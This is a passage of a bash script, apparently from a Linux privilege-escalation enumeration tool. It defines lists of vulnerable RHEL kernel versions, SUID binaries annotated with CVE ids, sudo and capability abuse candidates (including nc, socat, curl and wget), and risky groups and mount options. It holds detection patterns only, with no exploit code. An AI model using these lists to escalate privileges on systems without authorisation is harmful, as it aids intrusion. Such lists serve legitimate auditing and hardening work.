kernelDCW_Rhel5_3="2.6.18-274.17.1.el5|2.6.18-274.18.1.el5|2.6.18-308.el5|2.6.18-308.1.1.el5|2.6.18-308.4.1.el5|2.6.18-308.8.1.el5|2.6.18-308.8.2.el5|2.6.18-308.11.1.el5|2.6.18-308.13.1.el5|2.6.18-308.16.1.el5|2.6.18-308.20.1.el5|2.6.18-308.24.1.el5|2.6.18-348.el5|2.6.18-348.1.1.el5|2.6.18-348.2.1.el5|2.6.18-348.3.1.el5|2.6.18-348.4.1.el5|2.6.18-348.6.1.el5|2.6.18-348.12.1.el5|2.6.18-348.16.1.el5|2.6.18-348.18.1.el5|2.6.18-348.19.1.el5|2.6.18-348.21.1.el5|2.6.18-348.22.1.el5|2.6.18-348.23.1.el5|2.6.18-348.25.1.el5|2.6.18-348.27.1.el5|2.6.18-348.28.1.el5|2.6.18-348.29.1.el5|2.6.18-348.30.1.el5|2.6.18-348.31.2.el5|2.6.18-371.el5|2.6.18-371.1.2.el5|2.6.18-371.3.1.el5|2.6.18-371.4.1.el5|2.6.18-371.6.1.el5|2.6.18-371.8.1.el5|2.6.18-371.9.1.el5|2.6.18-371.11.1.el5|2.6.18-371.12.1.el5|2.6.18-398.el5|2.6.18-400.el5|2.6.18-400.1.1.el5|2.6.18-402.el5|2.6.18-404.el5|2.6.18-406.el5|2.6.18-407.el5|2.6.18-408.el5|2.6.18-409.el5|2.6.18-410.el5|2.6.18-411.el5|2.6.18-412.el5"
kernelDCW_Rhel6_1="2.6.33.9-rt31.66.el6rt|2.6.33.9-rt31.74.el6rt|2.6.33.9-rt31.75.el6rt|2.6.33.9-rt31.79.el6rt|3.0.9-rt26.45.el6rt|3.0.9-rt26.46.el6rt|3.0.18-rt34.53.el6rt|3.0.25-rt44.57.el6rt|3.0.30-rt50.62.el6rt|3.0.36-rt57.66.el6rt|3.2.23-rt37.56.el6rt|3.2.33-rt50.66.el6rt|3.6.11-rt28.20.el6rt|3.6.11-rt30.25.el6rt|3.6.11.2-rt33.39.el6rt|3.6.11.5-rt37.55.el6rt|3.8.13-rt14.20.el6rt|3.8.13-rt14.25.el6rt|3.8.13-rt27.33.el6rt|3.8.13-rt27.34.el6rt|3.8.13-rt27.40.el6rt|3.10.0-229.rt56.144.el6rt|3.10.0-229.rt56.147.el6rt|3.10.0-229.rt56.149.el6rt|3.10.0-229.rt56.151.el6rt|3.10.0-229.rt56.153.el6rt|3.10.0-229.rt56.158.el6rt|3.10.0-229.rt56.161.el6rt|3.10.0-229.rt56.162.el6rt|3.10.0-327.rt56.170.el6rt|3.10.0-327.rt56.171.el6rt|3.10.0-327.rt56.176.el6rt|3.10.0-327.rt56.183.el6rt|3.10.0-327.rt56.190.el6rt|3.10.0-327.rt56.194.el6rt|3.10.0-327.rt56.195.el6rt|3.10.0-327.rt56.197.el6rt|3.10.33-rt32.33.el6rt|3.10.33-rt32.34.el6rt|3.10.33-rt32.43.el6rt|3.10.33-rt32.45.el6rt|3.10.33-rt32.51.el6rt|3.10.33-rt32.52.el6rt|3.10.58-rt62.58.el6rt|3.10.58-rt62.60.el6rt|2.6.32-71.7.1.el6|2.6.32-71.14.1.el6|2.6.32-71.18.1.el6|2.6.32-71.18.2.el6|2.6.32-71.24.1.el6|2.6.32-71.29.1.el6|2.6.32-71.31.1.el6|2.6.32-71.34.1.el6|2.6.32-71.35.1.el6|2.6.32-71.36.1.el6|2.6.32-71.37.1.el6|2.6.32-71.38.1.el6|2.6.32-71.39.1.el6|2.6.32-71.40.1.el6|2.6.32-131.0.15.el6|2.6.32-131.2.1.el6|2.6.32-131.4.1.el6|2.6.32-131.6.1.el6|2.6.32-131.12.1.el6"
kernelDCW_Rhel6_2="2.6.32-131.17.1.el6|2.6.32-131.21.1.el6|2.6.32-131.22.1.el6|2.6.32-131.25.1.el6|2.6.32-131.26.1.el6|2.6.32-131.28.1.el6|2.6.32-131.29.1.el6|2.6.32-131.30.1.el6|2.6.32-131.30.2.el6|2.6.32-131.33.1.el6|2.6.32-131.35.1.el6|2.6.32-131.36.1.el6|2.6.32-131.37.1.el6|2.6.32-131.38.1.el6|2.6.32-131.39.1.el6|2.6.32-220.el6|2.6.32-220.2.1.el6|2.6.32-220.4.1.el6|2.6.32-220.4.2.el6|2.6.32-220.4.7.bgq.el6|2.6.32-220.7.1.el6|2.6.32-220.7.3.p7ih.el6|2.6.32-220.7.4.p7ih.el6|2.6.32-220.7.6.p7ih.el6|2.6.32-220.7.7.p7ih.el6|2.6.32-220.13.1.el6|2.6.32-220.17.1.el6|2.6.32-220.23.1.el6|2.6.32-220.24.1.el6|2.6.32-220.25.1.el6|2.6.32-220.26.1.el6|2.6.32-220.28.1.el6|2.6.32-220.30.1.el6|2.6.32-220.31.1.el6|2.6.32-220.32.1.el6|2.6.32-220.34.1.el6|2.6.32-220.34.2.el6|2.6.32-220.38.1.el6|2.6.32-220.39.1.el6|2.6.32-220.41.1.el6|2.6.32-220.42.1.el6|2.6.32-220.45.1.el6|2.6.32-220.46.1.el6|2.6.32-220.48.1.el6|2.6.32-220.51.1.el6|2.6.32-220.52.1.el6|2.6.32-220.53.1.el6|2.6.32-220.54.1.el6|2.6.32-220.55.1.el6|2.6.32-220.56.1.el6|2.6.32-220.57.1.el6|2.6.32-220.58.1.el6|2.6.32-220.60.2.el6|2.6.32-220.62.1.el6|2.6.32-220.63.2.el6|2.6.32-220.64.1.el6|2.6.32-220.65.1.el6|2.6.32-220.66.1.el6|2.6.32-220.67.1.el6|2.6.32-279.el6|2.6.32-279.1.1.el6|2.6.32-279.2.1.el6|2.6.32-279.5.1.el6|2.6.32-279.5.2.el6|2.6.32-279.9.1.el6|2.6.32-279.11.1.el6|2.6.32-279.14.1.bgq.el6|2.6.32-279.14.1.el6|2.6.32-279.19.1.el6|2.6.32-279.22.1.el6|2.6.32-279.23.1.el6|2.6.32-279.25.1.el6|2.6.32-279.25.2.el6|2.6.32-279.31.1.el6|2.6.32-279.33.1.el6|2.6.32-279.34.1.el6|2.6.32-279.37.2.el6|2.6.32-279.39.1.el6"
kernelDCW_Rhel6_3="2.6.32-279.41.1.el6|2.6.32-279.42.1.el6|2.6.32-279.43.1.el6|2.6.32-279.43.2.el6|2.6.32-279.46.1.el6|2.6.32-358.el6|2.6.32-358.0.1.el6|2.6.32-358.2.1.el6|2.6.32-358.6.1.el6|2.6.32-358.6.2.el6|2.6.32-358.6.3.p7ih.el6|2.6.32-358.11.1.bgq.el6|2.6.32-358.11.1.el6|2.6.32-358.14.1.el6|2.6.32-358.18.1.el6|2.6.32-358.23.2.el6|2.6.32-358.28.1.el6|2.6.32-358.32.3.el6|2.6.32-358.37.1.el6|2.6.32-358.41.1.el6|2.6.32-358.44.1.el6|2.6.32-358.46.1.el6|2.6.32-358.46.2.el6|2.6.32-358.48.1.el6|2.6.32-358.49.1.el6|2.6.32-358.51.1.el6|2.6.32-358.51.2.el6|2.6.32-358.55.1.el6|2.6.32-358.56.1.el6|2.6.32-358.59.1.el6|2.6.32-358.61.1.el6|2.6.32-358.62.1.el6|2.6.32-358.65.1.el6|2.6.32-358.67.1.el6|2.6.32-358.68.1.el6|2.6.32-358.69.1.el6|2.6.32-358.70.1.el6|2.6.32-358.71.1.el6|2.6.32-358.72.1.el6|2.6.32-358.73.1.el6|2.6.32-358.111.1.openstack.el6|2.6.32-358.114.1.openstack.el6|2.6.32-358.118.1.openstack.el6|2.6.32-358.123.4.openstack.el6|2.6.32-431.el6|2.6.32-431.1.1.bgq.el6|2.6.32-431.1.2.el6|2.6.32-431.3.1.el6|2.6.32-431.5.1.el6|2.6.32-431.11.2.el6|2.6.32-431.17.1.el6|2.6.32-431.20.3.el6|2.6.32-431.20.5.el6|2.6.32-431.23.3.el6|2.6.32-431.29.2.el6|2.6.32-431.37.1.el6|2.6.32-431.40.1.el6|2.6.32-431.40.2.el6|2.6.32-431.46.2.el6|2.6.32-431.50.1.el6|2.6.32-431.53.2.el6|2.6.32-431.56.1.el6|2.6.32-431.59.1.el6|2.6.32-431.61.2.el6|2.6.32-431.64.1.el6|2.6.32-431.66.1.el6|2.6.32-431.68.1.el6|2.6.32-431.69.1.el6|2.6.32-431.70.1.el6"
kernelDCW_Rhel6_4="2.6.32-431.71.1.el6|2.6.32-431.72.1.el6|2.6.32-431.73.2.el6|2.6.32-431.74.1.el6|2.6.32-504.el6|2.6.32-504.1.3.el6|2.6.32-504.3.3.el6|2.6.32-504.8.1.el6|2.6.32-504.8.2.bgq.el6|2.6.32-504.12.2.el6|2.6.32-504.16.2.el6|2.6.32-504.23.4.el6|2.6.32-504.30.3.el6|2.6.32-504.30.5.p7ih.el6|2.6.32-504.33.2.el6|2.6.32-504.36.1.el6|2.6.32-504.38.1.el6|2.6.32-504.40.1.el6|2.6.32-504.43.1.el6|2.6.32-504.46.1.el6|2.6.32-504.49.1.el6|2.6.32-504.50.1.el6|2.6.32-504.51.1.el6|2.6.32-504.52.1.el6|2.6.32-573.el6|2.6.32-573.1.1.el6|2.6.32-573.3.1.el6|2.6.32-573.4.2.bgq.el6|2.6.32-573.7.1.el6|2.6.32-573.8.1.el6|2.6.32-573.12.1.el6|2.6.32-573.18.1.el6|2.6.32-573.22.1.el6|2.6.32-573.26.1.el6|2.6.32-573.30.1.el6|2.6.32-573.32.1.el6|2.6.32-573.34.1.el6|2.6.32-642.el6|2.6.32-642.1.1.el6|2.6.32-642.3.1.el6|2.6.32-642.4.2.el6|2.6.32-642.6.1.el6"
kernelDCW_Rhel7="3.10.0-229.rt56.141.el7|3.10.0-229.1.2.rt56.141.2.el7_1|3.10.0-229.4.2.rt56.141.6.el7_1|3.10.0-229.7.2.rt56.141.6.el7_1|3.10.0-229.11.1.rt56.141.11.el7_1|3.10.0-229.14.1.rt56.141.13.el7_1|3.10.0-229.20.1.rt56.141.14.el7_1|3.10.0-229.rt56.141.el7|3.10.0-327.rt56.204.el7|3.10.0-327.4.5.rt56.206.el7_2|3.10.0-327.10.1.rt56.211.el7_2|3.10.0-327.13.1.rt56.216.el7_2|3.10.0-327.18.2.rt56.223.el7_2|3.10.0-327.22.2.rt56.230.el7_2|3.10.0-327.28.2.rt56.234.el7_2|3.10.0-327.28.3.rt56.235.el7|3.10.0-327.36.1.rt56.237.el7|3.10.0-123.el7|3.10.0-123.1.2.el7|3.10.0-123.4.2.el7|3.10.0-123.4.4.el7|3.10.0-123.6.3.el7|3.10.0-123.8.1.el7|3.10.0-123.9.2.el7|3.10.0-123.9.3.el7|3.10.0-123.13.1.el7|3.10.0-123.13.2.el7|3.10.0-123.20.1.el7|3.10.0-229.el7|3.10.0-229.1.2.el7|3.10.0-229.4.2.el7|3.10.0-229.7.2.el7|3.10.0-229.11.1.el7|3.10.0-229.14.1.el7|3.10.0-229.20.1.el7|3.10.0-229.24.2.el7|3.10.0-229.26.2.el7|3.10.0-229.28.1.el7|3.10.0-229.30.1.el7|3.10.0-229.34.1.el7|3.10.0-229.38.1.el7|3.10.0-229.40.1.el7|3.10.0-229.42.1.el7|3.10.0-327.el7|3.10.0-327.3.1.el7|3.10.0-327.4.4.el7|3.10.0-327.4.5.el7|3.10.0-327.10.1.el7|3.10.0-327.13.1.el7|3.10.0-327.18.2.el7|3.10.0-327.22.2.el7|3.10.0-327.28.2.el7|3.10.0-327.28.3.el7|3.10.0-327.36.1.el7|3.10.0-327.36.2.el7|3.10.0-229.1.2.ael7b|3.10.0-229.4.2.ael7b|3.10.0-229.7.2.ael7b|3.10.0-229.11.1.ael7b|3.10.0-229.14.1.ael7b|3.10.0-229.20.1.ael7b|3.10.0-229.24.2.ael7b|3.10.0-229.26.2.ael7b|3.10.0-229.28.1.ael7b|3.10.0-229.30.1.ael7b|3.10.0-229.34.1.ael7b|3.10.0-229.38.1.ael7b|3.10.0-229.40.1.ael7b|3.10.0-229.42.1.ael7b|4.2.0-0.21.el7"
filename="$SCRIPTNAME.txt$RANDOM"

MyUID=$(id -u $(whoami))
if [ "$MyUID" ]; then myuid=$MyUID; elif [ $(id -u $(whoami) 2>/dev/null) ]; then myuid=$(id -u $(whoami) 2>/dev/null); elif [ "$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1)" ]; then myuid=$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1); fi
if [ $myuid -gt 2147483646 ]; then baduid="|$myuid"; fi
idB="euid|egid$baduid"
sudovB="[01].[012345678].[0-9]+|1.9.[01234]|1.9.5p1"

mounted=$( (cat /proc/self/mountinfo || cat /proc/1/mountinfo) 2>/dev/null | cut -d " " -f5 | grep "^/" | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
if ! [ "$mounted" ]; then 
  mounted=$( (mount -l || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts) 2>/dev/null | grep "^/" | cut -d " " -f1 | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
fi
if ! [ "$mounted" ]; then mounted="ImPoSSssSiBlEee"; fi 
mountG="swap|/cdrom|/floppy|/dev/shm"
notmounted=$(cat /etc/fstab 2>/dev/null | grep "^/" | grep -Ev "$mountG" | awk '{print $1}' | grep -Ev "$mounted" | tr '\n' '|')"ImPoSSssSiBlEee"
mountpermsB="\Wsuid|\Wuser|\Wexec"
mountpermsG="nosuid|nouser|noexec"

rootcommon="/init$|upstart-udev-bridge|udev|/getty|cron|apache2|java|tomcat|/vmtoolsd|/VGAuthService"

groupsB="\(root\)|\(shadow\)|\(admin\)|\(video\)|\(adm\)|\(wheel\)|\(auth\)"
groupsVB="\(sudo\)|\(docker\)|\(lxd\)|\(disk\)|\(lxc\)"
knw_grps='\(lpadmin\)|\(cdrom\)|\(plugdev\)|\(nogroup\)' 
mygroups=$(groups 2>/dev/null | tr " " "|")


sidG1="/abuild-sudo$|/accton$|/allocate$|/ARDAgent$|/arping$|/atq$|/atrm$|/authpf$|/authpf-noip$|/authopen$|/batch$|/bbsuid$|/bsd-write$|/btsockstat$|/bwrap$|/cacaocsc$|/camel-lock-helper-1.2$|/ccreds_validate$|/cdrw$|/chage$|/check-foreground-console$|/chrome-sandbox$|/chsh$|/cons.saver$|/crontab$|/ct$|/cu$|/dbus-daemon-launch-helper$|/deallocate$|/desktop-create-kmenu$|/dma$|/dma-mbox-create$|/dmcrypt-get-device$|/doas$|/dotlockfile$|/dotlock.mailutils$|/dtaction$|/dtfile$|/eject$|/execabrt-action-install-debuginfo-to-abrt-cache$|/execdbus-daemon-launch-helper$|/execdma-mbox-create$|/execlockspool$|/execlogin_chpass$|/execlogin_lchpass$|/execlogin_passwd$|/execssh-keysign$|/execulog-helper$|/exim4|/expiry$|/fdformat$|/fstat$|/fusermount$|/fusermount3$"
sidG2="/gnome-pty-helper$|/glines$|/gnibbles$|/gnobots2$|/gnome-suspend$|/gnometris$|/gnomine$|/gnotski$|/gnotravex$|/gpasswd$|/gpg$|/gpio$|/gtali|/.hal-mtab-lock$|/helper$|/imapd$|/inndstart$|/kismet_cap_nrf_51822$|/kismet_cap_nxp_kw41z$|/kismet_cap_ti_cc_2531$|/kismet_cap_ti_cc_2540$|/kismet_cap_ubertooth_one$|/kismet_capture$|/kismet_cap_linux_bluetooth$|/kismet_cap_linux_wifi$|/kismet_cap_nrf_mousejack$|/ksu$|/list_devices$|/load_osxfuse$|/locate$|/lock$|/lockdev$|/lockfile$|/login_activ$|/login_crypto$|/login_radius$|/login_skey$|/login_snk$|/login_token$|/login_yubikey$|/lpc$|/lpd$|/lpd-port$|/lppasswd$|/lpq$|/lpr$|/lprm$|/lpset$|/lxc-user-nic$|/mahjongg$|/mail-lock$|/mailq$|/mail-touchlock$|/mail-unlock$|/mksnap_ffs$|/mlocate$|/mlock$|/mount$|/mount.cifs$|/mount.ecryptfs_private$|/mount.nfs$|/mount.nfs4$|/mount_osxfuse$|/mtr$|/mutt_dotlock$"
sidG3="/ncsa_auth$|/netpr$|/netkit-rcp$|/netkit-rlogin$|/netkit-rsh$|/netreport$|/netstat$|/newgidmap$|/newtask$|/newuidmap$|/nvmmctl$|/opieinfo$|/opiepasswd$|/pam_auth$|/pam_extrausers_chkpwd$|/pam_timestamp_check$|/pamverifier$|/pfexec$|/ping$|/ping6$|/pmconfig$|/pmap$|/polkit-agent-helper-1$|/polkit-explicit-grant-helper$|/polkit-grant-helper$|/polkit-grant-helper-pam$|/polkit-read-auth-helper$|/polkit-resolve-exe-helper$|/polkit-revoke-helper$|/polkit-set-default-helper$|/postdrop$|/postqueue$|/poweroff$|/ppp$|/procmail$|/pstat$|/pt_chmod$|/pwdb_chkpwd$|/quota$|/rcmd|/remote.unknown$|/rlogin$|/rmformat$|/rnews$|/run-mailcap$|/sacadm$|/same-gnome$|screen.real$|/security_authtrampoline$|/sendmail.sendmail$|/shutdown$|/skeyaudit$|/skeyinfo$|/skeyinit$|/sliplogin|/slocate$|/smbmnt$|/smbumount$|/smpatch$|/smtpctl$|/sperl5.8.8$|/ssh-agent$|/ssh-keysign$|/staprun$|/startinnfeed$|/stclient$|/su$|/suexec$|/sys-suspend$|/sysstat$|/systat$"
sidG4="/telnetlogin$|/timedc$|/tip$|/top$|/traceroute6$|/traceroute6.iputils$|/trpt$|/tsoldtlabel$|/tsoljdslabel$|/tsolxagent$|/ufsdump$|/ufsrestore$|/ulog-helper$|/umount.cifs$|/umount.nfs$|/umount.nfs4$|/unix_chkpwd$|/uptime$|/userhelper$|/userisdnctl$|/usernetctl$|/utempter$|/utmp_update$|/uucico$|/uuglist$|/uuidd$|/uuname$|/uusched$|/uustat$|/uux$|/uuxqt$|/VBoxHeadless$|/VBoxNetAdpCtl$|/VBoxNetDHCP$|/VBoxNetNAT$|/VBoxSDL$|/VBoxVolInfo$|/VirtualBoxVM$|/vmstat$|/vmware-authd$|/vmware-user-suid-wrapper$|/vmware-vmx$|/vmware-vmx-debug$|/vmware-vmx-stats$|/vncserver-x11$|/volrmmount$|/w$|/wall$|/whodo$|/write$|/X$|/Xorg.wrap$|/Xsun$|/Xvnc$|/yppasswd$"


sidB="/apache2$%Read_root_passwd__apache2_-f_/etc/shadow\(CVE-2019-0211\)\
 /at$%RTru64_UNIX_4.0g\(CVE-2002-1614\)\
 /abrt-action-install-debuginfo-to-abrt-cache$%CENTOS 7.1/Fedora22
 /chfn$%SuSE_9.3/10\
 /chkey$%Solaris_2.5.1\
 /chkperm$%Solaris_7.0_\
 /chpass$%2Vulns:OpenBSD_6.1_to_OpenBSD 6.6\(CVE-2019-19726\)--OpenBSD_2.7_i386/OpenBSD_2.6_i386/OpenBSD_2.5_1999/08/06/OpenBSD_2.5_1998/05/28/FreeBSD_4.0-RELEASE/FreeBSD_3.5-RELEASE/FreeBSD_3.4-RELEASE/NetBSD_1.4.2\
 /chpasswd$%SquirrelMail\(2004-04\)\
 /dtappgather$%Solaris_7_<_11_\(SPARC/x86\)\(CVE-2017-3622\)\
 /dtprintinfo$%Solaris_10_\(x86\)_and_lower_versions_also_SunOS_5.7_to_5.10\
 /dtsession$%Oracle_Solaris_10_1/13_and_earlier\(CVE-2020-2696\)\
 /eject$%FreeBSD_mcweject_0.9/SGI_IRIX_6.2\
 /ibstat$%IBM_AIX_Version_6.1/7.1\(09-2013\)\
 /kcheckpass$%KDE_3.2.0_<-->_3.4.2_\(both_included\)\
 /kdesud$%KDE_1.1/1.1.1/1.1.2/1.2\
 /keybase-redirector%CentOS_Linux_release_7.4.1708\
 /login$%IBM_AIX_3.2.5/SGI_IRIX_6.4\
 /lpc$%S.u.S.E_Linux_5.2\
 /lpr$%BSD/OS2.1/FreeBSD2.1.5/NeXTstep4.x/IRIX6.4/SunOS4.1.3/4.1.4\(09-1996\)\
 /mail.local$%NetBSD_7.0-7.0.1__6.1-6.1.5__6.0-6.0.6
 /mount$%Apple_Mac_OSX\(Lion\)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\
 /movemail$%Emacs\(08-1986\)\
 /mrinfo$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /mtrace$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /netprint$%IRIX_5.3/6.2/6.3/6.4/6.5/6.5.11\
 /newgrp$%HP-UX_10.20\
 /ntfs-3g$%Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others\(02-2017\)\
 /passwd$%Apple_Mac_OSX\(03-2006\)/Solaris_8/9\(12-2004\)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1\(02-1997\)\
 /pkexec$%Linux4.10_to_5.1.17\(CVE-2019-13272\)/rhel_6\(CVE-2011-1485\)\
 /pppd$%Apple_Mac_OSX_10.4.8\(05-2007\)\
 /pt_chown$%GNU_glibc_2.1/2.1.1_-6\(08-1999\)\
 /pulseaudio$%\(Ubuntu_9.04/Slackware_12.2.0\)\
 /rcp$%RedHat_6.2\
 /rdist$%Solaris_10/OpenSolaris\
 /rsh$%Apple_Mac_OSX_10.9.5/10.10.5\(09-2015\)\
 /screen$%GNU_Screen_4.5.0\
 /sdtcm_convert$%Sun_Solaris_7.0\
 /sendmail$%Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_\(SGI_ProPack_1.2/1.3\)\
 /snap-confine$%Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation\(CVE-2019-7304\)\
 /sudo%check_if_the_sudo_version_is_vulnerable\
 /Serv-U%FTP_Server<15.1.7(CVE-2019-12181)
 /sudoedit$%Sudo/SudoEdit_1.6.9p21/1.7.2p4/\(RHEL_5/6/7/Ubuntu\)/Sudo<=1.8.14\
 /tmux$%Tmux_1.3_1.4_privesc\(CVE-2011-1496\)\
 /traceroute$%LBL_Traceroute_\[2000-11-15\]\
 /ubuntu-core-launcher$%Befre_1.0.27.1\(CVE-2016-1580\)\
 /umount$%BSD/Linux\(08-1996\)\
 /umount-loop$%Rocks_Clusters<=4.1\(07-2006\)\
 /uucp$%Taylor_UUCP_1.0.6\
 /XFree86$%XFree86_X11R6_3.3.x/4.0/4.x/3.3\(03-2003\)\
 /xlock$%BSD/OS_2.1/DG/UX_7.0/Debian_1.3/HP-UX_10.34/IBM_AIX_4.2/SGI_IRIX_6.4/Solaris_2.5.1\(04-1997\)\
 /xscreensaver%Solaris_11.x\(CVE-2019-3010\)\
 /xorg$%Xorg_1.19_to_1.20.x\(CVE_2018-14665\)/xorg-x11-server<=1.20.3/AIX_7.1_\(6.x_to_7.x_should_be_vulnerable\)_X11.base.rte<7.1.5.32_and_\
 /xterm$%Solaris_5.5.1_X11R6.3\(05-1997\)/Debian_xterm_version_222-1etch2\(01-2009\)"

sidVB='/ab$|/agetty$|/alpine$|/ar$|/aria2c$|/arj$|/arp$|/as$|/ascii-xfr$|/ash$|/aspell$|/atobm$|/awk$|/base32$|/base64$|/basenc$|/basez$|/bash$|/batcat$|/bc$|/bridge$|/busybox$|/byebug$|/bzip2$|/cabal$|/capsh$|/cat$|/chmod$|/choom$|/chown$|/chroot$|/cmp$|/column$|/comm$|/composer$|/cp$|/cpio$|/cpulimit$|/csh$|/csplit$|/csvtool$|/cupsfilter$|/curl$|/cut$|/dash$|/date$|/dd$|/debugfs$|/dialog$|/diff$|/dig$|/distcc$|/dmsetup$|/docker$|/dosbox$|/dvips$|/ed$|/efax$|/emacs$|/env$|/eqn$|/espeak$|/expand$|/expect$|/file$|/find$|/fish$|/flock$|/fmt$|/fold$|/gawk$|/gcore$|/gdb$|/genie$|/genisoimage$|/gimp$|/ginsh$|/git$|/grep$|/gtester$|/gzip$|/hd$|/head$|/hexdump$|/highlight$|/hping3$|/iconv$|/iftop$|/install$|/ionice$|/ip$|/ispell$|/jjs$|/joe$|/join$|/jq$|/jrunscript$|/ksh$|/ksshell$|/kubectl$|/latex$|/ldconfig$|/less$|/lftp$|/logsave$|/look$|/lua$|/lualatex$|/luatex$|/make$|/mawk$|/more$|/mosquitto$|/msgattrib$|/msgcat$|/msgconv$|/msgfilter$|/msgmerge$|/msguniq$|/multitime$'
sidVB2='/mv$|/mysql$|/nano$|/nasm$|/nawk$|/nc$|/nft$|/nice$|/nl$|/nm$|/nmap$|/node$|/nohup$|/octave$|/od$|/openssl$|/openvpn$|/pandoc$|/paste$|/pdflatex$|/pdftex$|/perf$|/perl$|/pexec$|/pg$|/php$|/pic$|/pico$|/pidstat$|/posh$|/pr$|/pry$|/psftp$|/ptx$|/python$|/rake$|/readelf$|/restic$|/rev$|/rlwrap$|/rpm$|/rpmdb$|/rpmquery$|/rpmverify$|/rsync$|/rtorrent$|/run-parts$|/rview$|/rvim$|/sash$|/scanmem$|/scp$|/scrot$|/sed$|/setarch$|/setfacl$|/setlock$|/shuf$|/slsh$|/socat$|/soelim$|/softlimit$|/sort$|/sqlite3$|/ss$|/ssh-keygen$|/ssh-keyscan$|/sshpass$|/start-stop-daemon$|/stdbuf$|/strace$|/strings$|/sysctl$|/systemctl$|/tac$|/tail$|/tar$|/taskset$|/tasksh$|/tbl$|/tclsh$|/tdbtool$|/tee$|/telnet$|/tex$|/tftp$|/tic$|/time$|/timeout$|/tmate$|/troff$|/ul$|/unexpand$|/uniq$|/unshare$|/unzip$|/update-alternatives$|/uudecode$|/uuencode$|/view$|/vigr$|/vim$|/vimdiff$|/vipw$|/w3m$|/watch$|/wc$|/wget$|/whiptail$|/xargs$|/xdotool$|/xelatex$|/xetex$|/xmodmap$|/xmore$|/xxd$|/xz$|/yash$|/zip$|/zsh$|/zsoelim$'
cfuncs='file|free|main|more|read|split|write'

sudoVB1=" \*|env_keep\W*\+=.*LD_PRELOAD|env_keep\W*\+=.*LD_LIBRARY_PATH|7z$|ab$|alpine$|ansible-playbook$|aoss$|apt-get$|apt$|ar$|aria2c$|arj$|arp$|as$|ascii-xfr$|ascii85$|ash$|aspell$|at$|atobm$|awk$|aws$|base32$|base58$|base64$|basenc$|basez$|bash$|batcat$|bc$|bconsole$|bpftrace$|bridge$|bundle$|bundler$|busctl$|busybox$|byebug$|bzip2$|c89$|c99$|cabal$|capsh$|cat$|cdist$|certbot$|check_by_ssh$|check_cups$|check_log$|check_memory$|check_raid$|check_ssl_cert$|check_statusfile$|chmod$|choom$|chown$|chroot$|cmp$|cobc$|column$|comm$|composer$|cowsay$|cowthink$|cp$|cpan$|cpio$|cpulimit$|crash$|crontab$|csh$|csplit$|csvtool$|cupsfilter$|curl$|cut$|dash$|date$|dd$|debugfs$|dialog$|diff$|dig$|distcc$|dmesg$|dmidecode$|dmsetup$|dnf$|docker$|dosbox$|dotnet$|dpkg$|dstat$|dvips$|easy_install$|eb$|ed$|efax$|emacs$|env$|eqn$|espeak$|ex$|exiftool$|expand$|expect$|facter$|file$|find$|fish$|flock$|fmt$|fold$|fping$|ftp$|gawk$|gcc$|gcloud$|gcore$|gdb$|gem$|genie$|genisoimage$|ghc$|ghci$|gimp$|ginsh$|git$|grc$|grep$|gtester$|gzip$|hd$|head$|hexdump$|highlight$|hping3$|iconv$|iftop$|install$|ionice$|ip$|irb$|ispell$|jjs$|joe$|join$|journalctl$|jq$|jrunscript$|jtag$|knife$|ksh$|ksshell$|ksu$|kubectl$|latex$|latexmk$|ldconfig$|less$|lftp$|ln$|loginctl$|logsave$|look$|ltrace$|lua$|lualatex$|luatex$|lwp-download$|lwp-request$|mail$|make$|man$|mawk$|more$|mosquitto$|mount$"
sudoVB2="msfconsole$|msgattrib$|msgcat$|msgconv$|msgfilter$|msgmerge$|msguniq$|mtr$|multitime$|mv$|mysql$|nano$|nasm$|nawk$|nc$|neofetch$|nft$|nice$|nl$|nm$|nmap$|node$|nohup$|npm$|nroff$|nsenter$|octave$|od$|openssl$|openvpn$|openvt$|opkg$|pandoc$|paste$|pdb$|pdflatex$|pdftex$|perf$|perl$|perlbug$|pexec$|pg$|php$|pic$|pico$|pidstat$|pip$|pkexec$|pkg$|posh$|pr$|pry$|psftp$|psql$|ptx$|puppet$|python$|rake$|readelf$|red$|redcarpet$|restic$|rev$|rlwrap$|rpm$|rpmdb$|rpmquery$|rpmverify$|rsync$|ruby$|run-mailcap$|run-parts$|rview$|rvim$|sash$|scanmem$|scp$|screen$|script$|scrot$|sed$|service$|setarch$|setfacl$|setlock$|sftp$|sg$|shuf$|slsh$|smbclient$|snap$|socat$|soelim$|softlimit$|sort$|split$|sqlite3$|sqlmap$|ss$|ssh-keygen$|ssh-keyscan$|ssh$|sshpass$|start-stop-daemon$|stdbuf$|strace$|strings$|su$|sysctl$|systemctl$|systemd-resolve$|tac$|tail$|tar$|task$|taskset$|tasksh$|tbl$|tclsh$|tcpdump$|tdbtool$|tee$|telnet$|tex$|tftp$|tic$|time$|timedatectl$|timeout$|tmate$|tmux$|top$|torify$|torsocks$|troff$|ul$|unexpand$|uniq$|unshare$|unzip$|update-alternatives$|uudecode$|uuencode$|valgrind$|vi$|view$|vigr$|vim$|vimdiff$|vipw$|virsh$|w3m$|wall$|watch$|wc$|wget$|whiptail$|wireshark$|wish$|xargs$|xdotool$|xelatex$|xetex$|xmodmap$|xmore$|xpad$|xxd$|xz$|yarn$|yash$|yum$|zathura$|zip$|zsh$|zsoelim$|zypper$"
sudoB="$(whoami)|ALL:ALL|ALL : ALL|ALL|env_keep|NOPASSWD|SETENV|/apache2|/cryptsetup|/mount"
sudoG="NOEXEC"

capsVB="cap_sys_admin:mount|python \
cap_sys_ptrace:python \
cap_sys_module:kmod|python \
cap_dac_override:python|vim \
cap_chown:chown|python \
cap_former:chown|python \
cap_setuid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
cap_setgid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
cap_net_raw:python|tcpdump"


